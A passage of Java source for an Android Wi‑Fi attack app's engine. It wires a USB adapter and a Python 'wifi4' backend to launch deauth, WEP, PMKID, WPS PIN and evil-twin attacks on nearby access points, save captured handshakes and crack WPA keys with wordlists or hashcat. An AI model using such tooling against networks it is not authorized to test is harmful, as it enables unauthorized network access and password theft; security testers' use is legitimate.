                        JSONObject done = event("attack_done");
                        done.put("ok", problem.isEmpty()).put("kind", kind)
                                .put("summary", problem.isEmpty() ? kind + " finished" : problem);
                        JSONArray foundKeys = status.optJSONArray("keys");
                        if (foundKeys != null) done.put("keys", foundKeys);
                        emitQuietly(done);
                        return;
                    }
                } catch (Exception broken) {
                    AppLog.error("OpxEngine", broken);
                    return;
                }
            }
        }, "wifi4-attack-watch");
        watcher.setDaemon(true);
        watcher.start();
    }

    private static JSONObject metric(String key, String label, String value) {
        JSONObject row = new JSONObject();
        try {
            row.put("key", key).put("label", label).put("value", value);
        } catch (Exception ignored) {
            // Three plain strings.
        }
        return row;
    }

    private String rateLabel(String key) {
        switch (key) {
            case "inject":
                return context.getString(com.opx.oss.R.string.wifi_rate_inject);
            case "data":
                return context.getString(com.opx.oss.R.string.wifi_rate_data);
            case "deauth":
                return context.getString(com.opx.oss.R.string.wifi_rate_deauth);
            case "eapol":
                return context.getString(com.opx.oss.R.string.wifi_rate_eapol);
            case "wep_iv":
                return context.getString(com.opx.oss.R.string.wifi_rate_wep_iv);
            default:
                return context.getString(com.opx.oss.R.string.wifi_rate_beacon);
        }
    }

    private void wifi4StopAttack() {
        boolean stopped = false;
        try {
            stopped = PythonChip.backendBool("stop_attack");
        } catch (RuntimeException failed) {
            AppLog.error("OpxEngine", failed);
        }
        JSONObject reply = event("wifi4_attack_stopped");
        try {
            reply.put("stopped", stopped);
        } catch (Exception ignored) {
            // A plain boolean.
        }
        emitQuietly(reply);
    }

    private void wifi4Status() {
        PythonChip.ensurePython(context);
        JSONObject reply = event("wifi4_status");
        try {
            String json = PythonChip.backendText("attack_status");
            JSONObject status = new JSONObject(json == null || json.isEmpty() ? "{}" : json);
            reply.put("running", status.optBoolean("running"));
            reply.put("kind", status.isNull("kind") ? JSONObject.NULL : status.opt("kind"));
            reply.put("bssid", status.isNull("bssid") ? JSONObject.NULL : status.opt("bssid"));
            reply.put("available", PythonChip.backendBool("available"));
        } catch (Exception failed) {
            try {
                reply.put("available", false).put("detail", String.valueOf(failed.getMessage()));
            } catch (Exception ignored) {
                // Reported without detail.
            }
        }
        emitQuietly(reply);
    }

    // -- wifi4's vault: captures, credentials and cracking ---------------------------------

    /**
     * wifi4's ``Config.captures_dir`` is relative in its desktop build, which is not a writable
     * place on Android; every save it attempted there failed. The app hands it an absolute
     * directory in its own files tree once per attached session.
     */
    private void wifi4Configure() {
        if (wifi4Configured) return;
        PythonChip.ensurePython(context);
        java.io.File directory = new java.io.File(context.getFilesDir(), "captures");
        if (!directory.isDirectory() && !directory.mkdirs()) {
            AppLog.info("OpxEngine", "cannot create the captures directory: " + directory);
        }
        if (PythonChip.backendBool("set_captures_dir", directory.getAbsolutePath())) {
            wifi4Configured = true;
        }
    }

    /** The saved captures and the keys wifi4 recovered, straight from its vault index. */
    private void captures() {
        try {
            wifi4Configure();
            JSONObject reply = new JSONObject(PythonChip.backendText("captures"));
            reply.put("event", "captures");
            emitQuietly(reply);
            return;
        } catch (Throwable failed) {
            AppLog.error("OpxEngine", failed);
        }
        JSONObject reply = event("captures");
        try {
            JSONArray files = Vault.toJson(context);
            long bytes = 0;
            for (int i = 0; i < files.length(); i++) {
                JSONObject file = files.optJSONObject(i);
                if (file != null) bytes += file.optLong("size");
            }
            reply.put("captures", new JSONArray()).put("credentials", new JSONArray())
                    .put("count", 0).put("cracked", 0).put("bytes", bytes)
                    .put("directory", Vault.dir(context).getAbsolutePath());
        } catch (Exception ignored) {
            // Plain values only.
        }
        emitQuietly(reply);
    }

    /** Which cracking tools this build can start, and the password sources behind them. */
    private void crackTools() {
        try {
            wifi4Configure();
            JSONObject reply = new JSONObject(PythonChip.backendText("crack_tools"));
            reply.put("event", "crack_tools").put("available", !cracking);
            emitQuietly(reply);
            return;
        } catch (Throwable failed) {
            AppLog.error("OpxEngine", failed);
        }
        JSONObject reply = event("crack_tools");
        try {
            JSONObject cpu = new JSONObject();
            cpu.put("tool", "cpu_crack")
                    .put("description", "Built-in CPU cracker (WPA/WPA2/PMKID)")
                    .put("available", true);
            JSONObject hashcat = new JSONObject();
            hashcat.put("tool", "hashcat").put("description", "Hashcat -m 22000")
                    .put("available", false)
                    .put("reason", "hashcat is not installed for this build");
            reply.put("tools", new JSONArray().put(cpu).put(hashcat)).put("rules", false);
        } catch (Exception ignored) {
            // Plain values only.
        }
        emitQuietly(reply);
    }

    /**
     * Queue one of wifi4's cracking jobs for a saved capture. False when the backend is not
     * importable, so the caller can fall back to the Java cracker.
     */
    private boolean wifi4Crack(JSONObject command) {
        String capture = command.optString("capture");
        if (capture.isEmpty()) return false;
        boolean started;
        try {
            wifi4Configure();
            JSONArray wordlists = command.optJSONArray("wordlists");
            started = PythonChip.backendBool("crack_start", capture,
                    command.optString("tool", "cpu_crack"),
                    wordlists == null ? "[]" : wordlists.toString(),
                    command.optBoolean("default_passwords", true),
                    command.optBoolean("ssid_passwords", true),
                    command.optBoolean("probed_ssids", false));
        } catch (Throwable failed) {
            // No wifi4 backend here: the Java cracker is the fallback.
            AppLog.error("OpxEngine", failed);
            return false;
        }
        JSONObject reply = event("crack_started");
        try {
            reply.put("capture", capture).put("tool", command.optString("tool", "cpu_crack"));
        } catch (Exception ignored) {
            // Two plain strings.
        }
        emitQuietly(reply);
        if (started) {
            cracking = true;
            watchWifi4Crack(capture);
        } else {
            JSONObject done = event("crack_done");
            try {
                done.put("capture", capture).put("ok", false).put("keys", new JSONArray())
                        .put("message", "wifi4 could not start the cracking job");
            } catch (Exception ignored) {
                // Plain values.
            }
            emitQuietly(done);
        }
        return true;
    }

    /** wifi4's job queue only answers polls: turn them into crack_progress/crack_done events. */
    private void watchWifi4Crack(String capture) {
        Thread watcher = new Thread(() -> {
            for (int i = 0; i < 7200; i++) {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException stopped) {
                    return;
                }
                try {
                    JSONObject status = new JSONObject(PythonChip.backendText("crack_poll"));
                    JSONObject progress = event("crack_progress");
                    progress.put("capture", capture)
                            .put("percent", status.isNull("percent")
                                    ? JSONObject.NULL : status.opt("percent"))
                            .put("message", status.optString("message", ""))
                            .put("detail", status.optString("detail", ""));
                    emitQuietly(progress);
                    if (status.optBoolean("done")) {
                        JSONObject done = event("crack_done");
                        JSONArray keys = status.optJSONArray("keys");
                        done.put("capture", capture).put("ok", status.optBoolean("ok"))
                                .put("keys", keys == null ? new JSONArray() : keys)
                                .put("message", status.optString("message", ""));
                        emitQuietly(done);
                        cracking = false;
                        return;
                    }
                } catch (Throwable broken) {
                    AppLog.error("OpxEngine", broken);
                    cracking = false;
                    return;
                }
            }
            cracking = false;
        }, "wifi4-crack-watch");
        watcher.setDaemon(true);
        watcher.start();
    }

    private void stopCrack() {
        cracking = false;
        try {
            wifi4Configure();
            PythonChip.backendBool("crack_stop");
        } catch (Throwable failed) {
            AppLog.error("OpxEngine", failed);
        }
        emitQuietly(event("crack_stopping"));
    }

    private void crackStatus() {
        JSONObject reply = event("crack_status");
        boolean running = cracking;
        try {
            wifi4Configure();
            running = new JSONObject(PythonChip.backendText("crack_poll"))
                    .optBoolean("running", running);
        } catch (Throwable failed) {
            AppLog.error("OpxEngine", failed);
        }
        try {
            reply.put("running", running);
        } catch (Exception ignored) {
            // One plain boolean.
        }
        emitQuietly(reply);
    }

    /**
     * Poll wifi4's AP watcher while the card is attached: it saves the handshakes and PMKIDs the
     * sink completed (with wifi4's dedupe and auto-crack), so its saves become capture_saved.
     */
    private void startWifi4VaultWatch() {
        if (wifi4VaultWatch) return;
        wifi4VaultWatch = true;
        Thread watch = new Thread(() -> {
            while (wifi4VaultWatch) {
                try {
                    Thread.sleep(1500);
                } catch (InterruptedException stopped) {
                    return;
                }
                if (!wifi4Attached) return;
                try {
                    JSONArray saved = new JSONArray(PythonChip.backendText("poll_captures"));
                    for (int i = 0; i < saved.length(); i++) {
                        JSONObject entry = saved.optJSONObject(i);
                        if (entry == null) continue;
                        emitQuietly(event("capture_saved")
                                .put("file", entry.optString("path"))
                                .put("bssid", entry.optString("bssid"))
                                .put("ssid", entry.optString("ssid"))
                                .put("kind", entry.optString("kind")));
                    }
                } catch (Throwable broken) {
                    AppLog.error("OpxEngine", broken);
                    return;
                }
            }
        }, "wifi4-vault-watch");
        watch.setDaemon(true);
        watch.start();
    }

    /** wifi4's encryption text folded into the app's pill buckets, without a Java AP object. */
    private static String bucketFor(String encryption) {
        String text = encryption == null ? "" : encryption;
        if ("WEP".equals(text)) return "WEP";
        if (text.startsWith("WPA3")) return "WPA3";
        if (text.startsWith("WPA2")) return "WPA2";
        if (text.startsWith("WPA")) return "WPA";
        return "OPEN";
    }

    /**
     * End a scan. wifi4's array stays attached with its AP table after the hop stops: that table
     * is what the target sheet reads (its attacks, clients and handshakes), so closing it here
     * would leave every row after {@code scan_done} without a target — exactly what a closed
     * array used to do. The card is released on detach and on engine stop, not at scan end, which
     * is also how wifi4's own console keeps the radio after hopping stops.
     */
    private void stopScan() {
        boolean wasRunning = scanEngine.isRunning();
        if (wifi4Attached) {
            wifi4Scanning = false;
            scanEngine.stop();
            try {
                // Stop hopping only: wifi4's stop_scan leaves the sink and its table readable.
                PythonChip.backendBool("stop_scan");
                wifi4Count = wifi4Refresh();
            } catch (Throwable failed) {
                AppLog.error("OpxEngine", failed);
            }
            // The rows already went out as network events; the count is wifi4's, not ScanBook's.
            JSONObject done = event("scan_done");
            try {
                done.put("count", wifi4Count).put("frames", scanEngine.frames())
                        .put("backend", "wifi4");
            } catch (Exception ignored) {
                // Plain values.
            }
            emitQuietly(done);
            return;
        }
        scanEngine.stop();
        releaseRadio();
        if (!wasRunning) emitScanDone();
    }

    /**
     * Drop both halves of the radio: wifi4's array (which owns the AP table) and the open card.
     * Only a detach or an engine stop does this; a finished scan keeps both, so its targets stay
     * attackable.
     */
    private void releaseRadio() {
        boolean wasWifi4 = wifi4Attached;
        wifi4Attached = false;
        wifi4Scanning = false;
        wifi4Count = 0;
        wifi4Configured = false;
        wifi4VaultWatch = false;
        synchronized (wifi4Sent) {
            wifi4Sent.clear();
        }
        if (wasWifi4) {
            try {
                PythonChip.backendBool("close");
            } catch (Throwable ignored) {
                // Its runtime may already be gone with the card.
            }
        }
        WifiChip stopping = chip;
        chip = null;
        for (WifiChip extra : cards.values()) {
            if (extra == stopping) continue;
            try {
                extra.close();
            } catch (Exception e) {
                AppLog.info("OpxEngine", "closing an extra adapter: " + e.getMessage());
            }
        }
        cards.clear();
        if (stopping != null) {
            try {
                stopping.close();
            } catch (Exception e) {
                AppLog.info("OpxEngine", "closing the adapter: " + e.getMessage());
            }
        }
        if (wasWifi4) emitQuietly(statusEvent());
    }

    /**
     * The adapter's doorbell: {@link com.opx.oss.UsbAutoConnect} sends this once the permission
     * is granted, so the card is open before the WiFi screen asks for a scan. The answer is the
     * {@code usb_attached} event that screen already draws.
     */
    private void usbAttach() {
        String path = firstSupportedDevice();
        if (path == null) {
            JSONObject waiting = event("usb_waiting");
            try {
                waiting.put("message", context.getString(com.opx.oss.R.string.wifi_usb_waiting));
            } catch (Exception ignored) {
                // One plain string.
            }
            emitQuietly(waiting);
            return;
        }
        try {
            WifiChip adapter = openChip(path);
            JSONObject attached = event("usb_attached");
            try {
                attached.put("iface", adapter.name());
            } catch (Exception ignored) {
                // One plain string.
            }
            emitQuietly(attached);
        } catch (Exception failed) {
            error("the adapter could not be opened: " + failed.getMessage());
        }
    }

    /** The card is gone: wifi4's table and the attacks built on it go with it. */
    private void usbLost() {
        releaseRadio();
        emitQuietly(event("usb_detached"));
    }

    /** The device path of the first attached adapter the engine has a driver for. */
    private String firstSupportedDevice() {
        UsbManager manager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        StringBuilder seen = new StringBuilder();
        try {
            for (String path : UsbFd.list()) {
                UsbDevice device = manager == null ? null : device(manager, path);
                if (device == null) continue;
                if (seen.length() > 0) seen.append(", ");
                seen.append(String.format("%04x:%04x", device.getVendorId(),
                        device.getProductId()));
                if (ChipRegistry.hasDriver(context, device.getVendorId(),
                        device.getProductId())) {
                    return path;
                }
            }
        } catch (Exception e) {
            AppLog.info("OpxEngine", "cannot ask the bridge for devices: " + e.getMessage());
        }
        // Which ids were passed over, so "no adapter" is distinguishable from "no driver".
        if (seen.length() > 0) AppLog.info("OpxEngine", "no driver claimed: " + seen);
        return null;
    }

    /** Every AP with the attacks the engine can actually run against it. */
    private void targets() throws Exception {
        if (wifi4Attached) {
            // The card is driven by wifi4's array: its table is the truth, clients included.
            wifi4TargetsAsTargets();
            return;
        }
        JSONArray targets = new JSONArray();
        for (AccessPoint ap : scan.list()) {
            JSONObject entry = ap.toJson();
            JSONArray attacks = new JSONArray();
            attacks.put(attackEntry("deauth", true, ""));
            if (ap.hidden) attacks.put(attackEntry("decloak", true, ""));
            if ("WEP".equals(ap.encryption)) {
                attacks.put(attackEntry("wep", true, ""));
            } else if (ap.encryption.startsWith("WPA2") || ap.encryption.startsWith("WPA3")) {
                attacks.put(attackEntry("pmkid", true, ""));
            }
            if (ap.wps) {
                attacks.put(attackEntry("wps", true, ""));
                try {
                    java.util.List<String> pins = WpsPins.forTarget(WpsPinDb.load(context),
                            Mac.of(ap.bssid), ap.ssid, null, null);
                    JSONArray candidates = new JSONArray();
                    for (int i = 0; i < Math.min(4, pins.size()); i++) candidates.put(pins.get(i));
                    entry.put("wps_candidates", candidates).put("wps_known", pins.size());
                } catch (Exception ignored) {
                    // A malformed BSSID only means no candidate list for this row.
                }
            }
            if (!ap.ssid.isEmpty()) {
                attacks.put(attackEntry("eviltwin", true, ""));
                attacks.put(attackEntry("captive", true, ""));
            }
            entry.put("attacks", attacks);
            targets.put(entry);
        }
        emit(event("targets").put("targets", targets).put("handshakes", handshakes.size()));
    }

    /** wifi4's table with the app's attack list, so the target sheet reads wifi4's clients. */
    private void wifi4TargetsAsTargets() {
        wifi4Configure();
        String json = PythonChip.backendText("targets");
        JSONArray rows;
        try {
            rows = new JSONArray(json == null || json.isEmpty() ? "[]" : json);
        } catch (Exception broken) {
            error("wifi4 targets: " + broken.getMessage());
            return;
        }
        JSONArray out = new JSONArray();
        int handshakeCount = 0;
        for (int i = 0; i < rows.length(); i++) {
            JSONObject row = rows.optJSONObject(i);
            if (row == null) continue;
            try {
                row.put("security", bucketFor(row.optString("privacy")));
                row.put("attacks", attacksFor(row));
                handshakeCount += row.optInt("handshakes");
                out.put(row);
            } catch (Exception ignored) {
                // One malformed row must not hide the rest.
            }
        }
        JSONObject reply = event("targets");
        try {
            reply.put("targets", out).put("handshakes", handshakeCount).put("backend", "wifi4");
            reply.put("interfaces", wifi4Interfaces());
        } catch (Exception ignored) {
            // Plain values.
        }
        emitQuietly(reply);
    }

    /** The names of the cards wifi4's array holds ({@code wlan0}, {@code wlan1}, …). */
    private JSONArray wifi4Interfaces() {
        JSONArray names = new JSONArray();
        try {
            JSONArray pooled = new JSONArray(PythonChip.backendText("interfaces"));
            for (int i = 0; i < pooled.length(); i++) {
                String name = pooled.optString(i, "");
                if (!name.isEmpty()) names.put(name);
            }
        } catch (Exception ignored) {
            // An empty list only means the sheet offers the connected card as both.
        }
        return names;
    }

    /**
     * The attacks wifi4's own campaigns can run against one of its rows: deauth, decloak (hidden),
     * WEP, PMKID (WPA2/WPA3) and the WPS PIN. Evil Twin needs a second interface and the captive
     * portal a running twin, so neither can start on the one card wifi4's array holds.
     */
    private JSONArray attacksFor(JSONObject row) {
        JSONArray attacks = new JSONArray();
        String encryption = row.optString("privacy");
        attacks.put(attackEntry("deauth", true, ""));
        if (row.optBoolean("hidden")) attacks.put(attackEntry("decloak", true, ""));
        if ("WEP".equals(encryption)) {
            attacks.put(attackEntry("wep", true, ""));
        } else if (encryption.startsWith("WPA2") || encryption.startsWith("WPA3")) {
            attacks.put(attackEntry("pmkid", true, ""));
        }
        if (row.optBoolean("wps")) {
            boolean locked = row.optBoolean("wps_locked");
            attacks.put(attackEntry("wps", !locked,
                    locked ? context.getString(com.opx.oss.R.string.wifi_attack_wps_locked) : ""));
        }
        if (row.optBoolean("eviltwin")) {
            String reason = row.optString("eviltwin_reason", "");
            attacks.put(attackEntry("eviltwin", reason.isEmpty(), reason));
        }
        return attacks;
    }

    /** One attack as the target sheet reads it: a kind, a label, and whether it can start. */
    private static JSONObject attackEntry(String kind, boolean enabled, String reason) {
        JSONObject entry = new JSONObject();
        try {
            entry.put("kind", kind).put("enabled", enabled)
                    .put("reason", reason == null ? "" : reason);
        } catch (Exception ignored) {
            // Four plain values cannot fail to serialize.
        }
        return entry;
    }

    /** The UI's attack command, run on wifi4's campaigns while wifi4 holds the card. */
    private void wifi4AttackCommand(JSONObject command) {
        String kind = command.optString("kind");
        String bssid = command.optString("bssid");
        if (bssid.isEmpty()) {
            error("no target BSSID");
            return;
        }
        String mapped = "wps".equals(kind) ? "pin" : kind;
        switch (mapped) {
            case "deauth":
            case "pmkid":
            case "pin":
            case "pbc":
            case "decloak":
            case "wep":
                // These campaigns own every knob themselves, exactly as in wifi4's TUI.
                wifi4Attack(mapped, bssid, null);
                return;
            case "eviltwin":
                // EvilTwinInput: the modal's twin/punter cards, BSSID, channel and punt cycle.
                wifi4Attack(mapped, bssid, command.optJSONObject("options"));
                return;
            default:
                error(kind + " runs on the Java engine, which wifi4's array is holding the card from");
                return;
        }
    }

    private JSONObject runtime() {
        JSONObject runtime = new JSONObject();
        try {
            runtime.put("kind", "native");
            runtime.put("engine", VERSION);
            runtime.put("usb", usbState());
            String selfCheck = SelfCheck.run();
            runtime.put("selfcheck", selfCheck == null ? "ok" : selfCheck);
            if (selfCheck != null) Log.w("OpxEngine", "self check failed: " + selfCheck);
        } catch (Exception ignored) {
            // The caller still gets the event.
        }
        return runtime;
    }

    /**
     * The radio as it is right now. {@code iface} is the name the open chip answers to; with no
     * chip there is nothing to name, so {@code connected} is false and the UI keeps its dash.
     */
    private JSONObject statusEvent() {
        JSONObject status = event("status");
        WifiChip live = chip;
        try {
            if (live == null) {
                status.put("iface", JSONObject.NULL).put("connected", false);
            } else {
                status.put("iface", live.name()).put("connected", true);
                String mac = live.mac();
                if (mac != null && !mac.isEmpty()) status.put("mac", mac);
            }
            status.put("usb", usbState());
        } catch (Exception ignored) {
            // Every value is a plain type.
        }
        return status;
    }

    private JSONObject usbState() {
        JSONObject usb = new JSONObject();
        try {
            usb.put("bridge", UsbHostBridge.isListening());
            usb.put("variable", UsbFd.FD_VARIABLE);
        } catch (Exception ignored) {
            // Nothing to report beyond the event itself.
        }
        return usb;
    }

    private static UsbDevice device(UsbManager manager, String path) {
        Map<String, UsbDevice> devices = manager.getDeviceList();
        if (devices == null) return null;
        for (UsbDevice device : devices.values()) {
            if (path.equals(device.getDeviceName())) return device;
        }
        return null;
    }

    private JSONObject event(String name) {
        JSONObject event = new JSONObject();
        try {
            event.put("event", name);
        } catch (Exception ignored) {
            // A JSONObject accepts every string key.
        }
        return event;
    }

    private void error(String message) {
        try {
            emit(event("error").put("message", message));
        } catch (Exception ignored) {
            // Nothing further to report.
        }
    }

    /**
     * The scan book as the app's rows: one {@code network} event per AP, which is what the list
     * is built from. Without these the run reports a count but the list stays empty.
     */
    private void emitNetworks() {
        for (AccessPoint ap : scan.list()) {
            JSONObject network = ap.toJson();
            try {
                network.put("event", "network");
                network.put("security", securityBucket(ap));
                network.put("privacy", ap.encryption);
                network.put("vendor", ap.wscManufacturer == null ? "" : ap.wscManufacturer);
                network.put("band", ap.channel > 14 ? "5" : "2.4");
            } catch (Exception ignored) {
                // Every value above is a plain type.
            }
            emitQuietly(network);
        }
    }

    /** wifi4's encryption text folded into the app's pill buckets, like the built-in radio path. */
    private static String securityBucket(AccessPoint ap) {
        if (ap.wpa3) return ap.transitionMode ? "WPA3_TRANSITION" : "WPA3";
        String encryption = ap.encryption == null ? "" : ap.encryption;
        if ("WEP".equals(encryption)) return "WEP";
        if (encryption.startsWith("WPA2")) return "WPA2";
        if (encryption.startsWith("WPA3")) return "WPA3";
        if (encryption.startsWith("WPA")) return "WPA";
        return "OPEN";
    }

    private void emitScanDone() {
        emitNetworks();
        JSONObject done = event("scan_done");
        try {
            done.put("count", scan.size());
            done.put("frames", scanEngine.frames());
        } catch (Exception ignored) {
            // Both values are plain numbers.
        }
        emitQuietly(done);
    }

    private void emitQuietly(JSONObject event) {
        try {
            emit(event);
        } catch (RuntimeException ignored) {
            // Nothing further to report.
        }
    }

    private void emit(JSONObject event) {
        if (stopped && !"stopped".equals(event.optString("event"))) return;
        Listener target = listener;
        if (target == null) return;
        try {
            target.onEvent(event);
        } catch (RuntimeException ignored) {
            // A listener that throws must not take the engine down with it.
        }
    }

    private void shutdown() {
        stopped = true;
        cracking = false;
        worker.shutdownNow();
        cracker.shutdownNow();
    }
}
